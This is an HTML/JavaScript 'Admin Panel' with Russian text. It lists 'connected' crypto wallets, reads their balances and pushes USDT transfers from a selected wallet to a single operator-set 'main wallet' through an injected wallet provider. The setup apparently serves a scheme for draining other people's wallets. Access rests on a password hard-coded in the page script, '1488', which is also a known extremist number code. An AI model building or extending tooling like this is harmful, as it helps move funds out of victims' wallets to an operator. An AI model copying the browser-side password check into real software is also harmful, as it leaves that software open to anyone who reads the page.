<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        * { box-sizing: border-box; }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0033 100%);
            color: #fff;
            margin: 0;
            padding: 0;
            min-height: 100vh;
        }

        .background-icons {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none;
            z-index: 1;
            opacity: 0.15;
        }

        .icon {
            position: absolute;
            font-size: 2.8rem;
            animation: float 25s infinite linear;
            color: #00ff9d;
        }

        @keyframes float {
            0% { transform: translateY(100vh) rotate(0deg); }
            100% { transform: translateY(-100vh) rotate(360deg); }
        }

        .container {
            position: relative;
            z-index: 2;
            max-width: 1000px;
            margin: 40px auto;
            padding: 40px 30px;
            background: rgba(20, 20, 40, 0.95);
            border-radius: 24px;
            backdrop-filter: blur(12px);
            border: 1px solid rgba(0, 255, 157, 0.2);
            box-shadow: 0 20px 60px rgba(0, 255, 157, 0.1);
        }

        h1 {
            font-size: 2.4rem;
            background: linear-gradient(90deg, #00ff9d, #00ccff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-align: center;
            margin-bottom: 4px;
        }

        .login-form {
            max-width: 400px;
            margin: 50px auto;
            text-align: center;
        }

        .login-form input {
            width: 100%;
            padding: 14px;
            margin: 15px 0;
            background: rgba(255,255,255,0.08);
            border: 1px solid rgba(0,255,157,0.3);
            border-radius: 12px;
            color: white;
            font-size: 1rem;
        }

        .login-form input::placeholder { color: #888; }

        .login-form button {
            padding: 14px;
            font-size: 1rem;
            font-weight: 600;
            background: linear-gradient(90deg, #00ff9d, #00cc88);
            color: black;
            border: none;
            border-radius: 16px;
            width: 100%;
            cursor: pointer;
            transition: all 0.2s;
        }

        .login-form button:hover { transform: translateY(-2px); }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }

        button {
            padding: 12px 24px;
            font-size: 0.95rem;
            font-weight: 600;
            background: linear-gradient(90deg, #00ff9d, #00cc88);
            color: black;
            border: none;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.2s;
        }

        button:hover:not(:disabled) { transform: translateY(-2px); }
        button:disabled { opacity: 0.5; cursor: not-allowed; }

        button.back {
            background: rgba(100, 150, 255, 0.2);
            color: #6496ff;
            border: 1px solid rgba(100, 150, 255, 0.5);
        }

        .wallets-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .wallet-card {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(0, 255, 157, 0.2);
            border-radius: 16px;
            padding: 20px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .wallet-card:hover {
            border-color: rgba(0, 255, 157, 0.5);
            background: rgba(0, 0, 0, 0.5);
            transform: translateY(-5px);
        }

        .wallet-card.selected {
            border-color: #00ff9d;
            background: rgba(0, 255, 157, 0.1);
        }

        .wallet-card .address {
            font-size: 0.9rem;
            color: #00ff9d;
            font-weight: 600;
            word-break: break-all;
            margin-bottom: 10px;
        }

        .wallet-card .balance {
            font-size: 1.2rem;
            font-weight: 600;
            color: #fff;
            margin-bottom: 10px;
        }

        .transfer-panel {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(0, 255, 157, 0.3);
            border-radius: 16px;
            padding: 30px;
            margin-top: 30px;
        }

        .transfer-panel h2 {
            color: #00ff9d;
            margin-top: 0;
        }

        .limit-warning {
            background: rgba(255, 193, 7, 0.15);
            border-left: 5px solid #ff6b6b;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            color: #ff9999;
        }

        input {
            width: 100%;
            padding: 14px;
            margin: 15px 0;
            background: rgba(255,255,255,0.08);
            border: 1px solid rgba(0,255,157,0.3);
            border-radius: 12px;
            color: white;
            font-size: 1rem;
        }

        input::placeholder { color: #888; }

        .transfer-form {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }

        .transfer-form input {
            grid-column: 1;
        }

        .transfer-form input:nth-child(2) {
            grid-column: 2;
        }

        .transfer-form input:nth-child(3) {
            grid-column: 1 / -1;
        }

        .transfer-form button {
            grid-column: 1 / -1;
            background: linear-gradient(90deg, #ff5f6d, #ff3d5a);
            color: #fff;
            padding: 16px;
        }

        .status {
            margin: 20px 0;
            padding: 15px;
            background: rgba(0,0,0,0.4);
            border-radius: 12px;
            border-left: 5px solid #00ff9d;
            font-size: 0.9rem;
            word-break: break-all;
        }

        .status.error { border-left-color: #ff5f6d; }

        .hidden { display: none; }

        .header-info {
            font-size: 0.9rem;
            color: #aaa;
        }

        .header-info .label {
            display: block;
            font-size: 0.75rem;
            color: #666;
            text-transform: uppercase;
        }
    </style>
</head>
<body>
    <div class="background-icons" id="icons"></div>

    <!-- Login Screen -->
    <div id="loginScreen" class="container">
        <div class="login-form">
            <h1>🔐 Admin Panel</h1>
            <p style="color: #aaa; margin-bottom: 30px;">Введи пароль для доступа</p>
            <input type="password" id="passwordInput" placeholder="Пароль" onkeypress="if(event.key==='Enter') loginAdmin()">
            <button onclick="loginAdmin()"><i class="fas fa-lock-open"></i> Войти</button>
            <div id="loginError"></div>
        </div>
    </div>

    <!-- Admin Screen -->
    <div id="adminScreen" class="container hidden">
        <div class="header">
            <div>
                <h1>📊 Admin Panel</h1>
            </div>
            <button class="back" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Выход</button>
        </div>

        <div class="header-info">
            <span class="label">Основной кошелёк:</span>
            <span id="mainWallet">0xa283ce959c5d0491bbe21b1687b46bf5090a7164</span>
            <button onclick="editMainWallet()" style="margin-left: 10px; padding: 5px 10px; font-size: 0.8rem;">Изменить</button>
        </div>

        <h2 style="color: #00ff9d; margin-top: 30px;">Подключённые кошельки</h2>
        <div class="wallets-grid" id="walletsGrid"></div>

        <div class="transfer-panel" id="transferPanel" style="display: none;">
            <h2><i class="fas fa-paper-plane"></i> Отправить перевод</h2>
            
            <div class="limit-warning">
                ⚠️ <strong>Максимум 10 USDT!</strong> Каждый перевод ограничен 10 USDT для безопасности
            </div>

            <div id="selectedWallet"></div>
            
            <div class="transfer-form">
                <input type="number" id="transferAmount" placeholder="Сумма USDT (макс 10)" step="0.01" min="0" max="10">
                <button onclick="performTransfer()" style="grid-column: 2; background: linear-gradient(90deg, #ff5f6d, #ff3d5a); color: #fff;"><i class="fas fa-paper-plane"></i> Отправить</button>
            </div>

            <div id="transferStatus"></div>
        </div>
    </div>

    <script>
        const iconsContainer = document.getElementById('icons');
        const symbols = ['🛡️','🔑','💎','📱','🌐','⚡','🔗','📈','💰','🔐'];
        for (let i = 0; i < 20; i++) {
            const icon = document.createElement('div');
            icon.className = 'icon';
            icon.textContent = symbols[Math.floor(Math.random()*symbols.length)];
            icon.style.left = Math.random() * 100 + 'vw';
            icon.style.animationDuration = (15 + Math.random()*25) + 's';
            icon.style.animationDelay = -Math.random()*40 + 's';
            iconsContainer.appendChild(icon);
        }

        const ADMIN_PASSWORD = '1488';
        const MAX_TRANSFER = 10; // USDT

        const ETHERS_SOURCES = [
            'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js',
            'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js',
            'https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js'
        ];

        function loadScript(src, timeoutMs = 7000) {
            return new Promise((resolve, reject) => {
                const script = document.createElement('script');
                script.src = src;
                const timer = setTimeout(() => { script.remove(); reject(new Error('timeout')); }, timeoutMs);
                script.onload = () => { clearTimeout(timer); resolve(); };
                script.onerror = () => { clearTimeout(timer); script.remove(); reject(new Error('load error')); };
                document.head.appendChild(script);
            });
        }

        async function ensureEthersLoaded() {
            if (typeof ethers !== 'undefined') return true;
            for (let i = 0; i < ETHERS_SOURCES.length; i++) {
                try {
                    await loadScript(ETHERS_SOURCES[i]);
                    if (typeof ethers !== 'undefined') return true;
                } catch (e) { }
            }
            throw new Error('Не удалось загрузить ethers.js');
        }

        function loginAdmin() {
            const password = document.getElementById('passwordInput').value;
            const error = document.getElementById('loginError');

            if (password === ADMIN_PASSWORD) {
                sessionStorage.setItem('adminAuthenticated', 'true');
                document.getElementById('loginScreen').classList.add('hidden');
                document.getElementById('adminScreen').classList.remove('hidden');
                loadWallets();
            } else {
                error.innerHTML = '<div class="status error">❌ Неверный пароль</div>';
                document.getElementById('passwordInput').value = '';
            }
        }

        function logout() {
            sessionStorage.removeItem('adminAuthenticated');
            document.getElementById('loginScreen').classList.remove('hidden');
            document.getElementById('adminScreen').classList.add('hidden');
            document.getElementById('passwordInput').value = '';
        }

        function checkAuthentication() {
            if (!sessionStorage.getItem('adminAuthenticated')) {
                document.getElementById('adminScreen').classList.add('hidden');
                document.getElementById('loginScreen').classList.remove('hidden');
            }
        }

        async function getBalance(address) {
            try {
                const response = await fetch('https://bsc-dataseed.binance.org:443', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_getBalance', params: [address, 'latest'], id: 1 })
                });
                const data = await response.json();
                if (data.result) {
                    return parseInt(data.result, 16) / (10 ** 18);
                }
            } catch (e) {
                console.error('Ошибка при чтении баланса:', e);
            }
            return 0;
        }

        async function loadWallets() {
            await ensureEthersLoaded();
            
            const wallets = JSON.parse(localStorage.getItem('wallets') || '[]');
            const grid = document.getElementById('walletsGrid');
            grid.innerHTML = '';

            if (wallets.length === 0) {
                grid.innerHTML = '<div style="grid-column: 1/-1; text-align: center; color: #aaa;">Нет подключённых кошельков</div>';
                return;
            }

            for (const wallet of wallets) {
                const balance = await getBalance(wallet.address);

                const card = document.createElement('div');
                card.className = 'wallet-card';
                card.innerHTML = `
                    <div class="address">${wallet.address.slice(0, 6)}...${wallet.address.slice(-4)}</div>
                    <div class="balance">${balance.toFixed(4)} BNB</div>
                    <div style="font-size: 0.8rem; color: #888;">Подключен: ${new Date(wallet.timestamp).toLocaleDateString('ru-RU')}</div>
                `;
                card.onclick = () => selectWallet(wallet, card);
                grid.appendChild(card);
            }
        }

        let selectedWallet = null;

        function selectWallet(wallet, card) {
            document.querySelectorAll('.wallet-card').forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
            selectedWallet = wallet;

            const panel = document.getElementById('transferPanel');
            panel.style.display = 'block';

            const selected = document.getElementById('selectedWallet');
            selected.innerHTML = `
                <div class="status" style="border-left-color: #ffc107;">
                    <strong>Выбран кошелёк:</strong> ${wallet.address}<br>
                    <strong>На этот адрес:</strong> ${document.getElementById('mainWallet').textContent}<br>
                    <strong>Максимум за раз:</strong> ${MAX_TRANSFER} USDT
                </div>
            `;
        }

        async function performTransfer() {
            if (!selectedWallet) return;

            const amount = parseFloat(document.getElementById('transferAmount').value);

            if (!amount || amount <= 0) {
                showStatus('Введи корректную сумму', true);
                return;
            }

            if (amount > MAX_TRANSFER) {
                showStatus(`❌ Максимум ${MAX_TRANSFER} USDT! Ты указал ${amount}`, true);
                return;
            }

            if (!window.ethereum) {
                showStatus('Для выполнения транзакции подключи MetaMask/Trust Wallet', true);
                return;
            }

            try {
                showStatus('⏳ Ожидаем подтверждения в кошельке...');

                const provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send('eth_requestAccounts', []);
                const signer = provider.getSigner();
                const signerAddress = await signer.getAddress();

                if (signerAddress.toLowerCase() !== selectedWallet.address.toLowerCase()) {
                    showStatus('❌ Выбранный кошелёк не совпадает с подключённым', true);
                    return;
                }

                const mainWallet = document.getElementById('mainWallet').textContent;
                const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955'; // USDT на BSC
                
                // ERC20 Transfer ABI
                const ERC20_ABI = [
                    'function transfer(address to, uint256 amount) returns (bool)',
                    'function balanceOf(address) returns (uint256)'
                ];

                const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
                const amountWei = ethers.utils.parseEther(amount.toString());

                const tx = await contract.transfer(mainWallet, amountWei);
                showStatus(`✅ Транзакция отправлена!<br><small>${tx.hash}</small>`);
                await tx.wait();
                showStatus(`✅ Перевод ${amount} USDT выполнен!<br><small>${tx.hash}</small>`);
                document.getElementById('transferAmount').value = '';
            } catch (e) {
                showStatus(`❌ Ошибка: ${e.message || e}`, true);
            }
        }

        function showStatus(message, isError = false) {
            const status = document.getElementById('transferStatus');
            status.innerHTML = `<div class="status ${isError ? 'error' : ''}">${message}</div>`;
        }

        function editMainWallet() {
            const newWallet = prompt('Введи адрес основного кошелька:', document.getElementById('mainWallet').textContent);
            if (newWallet) {
                if (newWallet.match(/^0x[a-fA-F0-9]{40}$/)) {
                    document.getElementById('mainWallet').textContent = newWallet;
                    localStorage.setItem('mainWallet', newWallet);
                } else {
                    alert('❌ Некорректный адрес');
                }
            }
        }

        // При загрузке страницы проверяем аутентификацию
        checkAuthentication();

        // Восстанавливаем основной кошелёк из памяти
        const saved = localStorage.getItem('mainWallet');
        if (saved) {
            document.getElementById('mainWallet').textContent = saved;
        }
    </script>
</body>
</html>
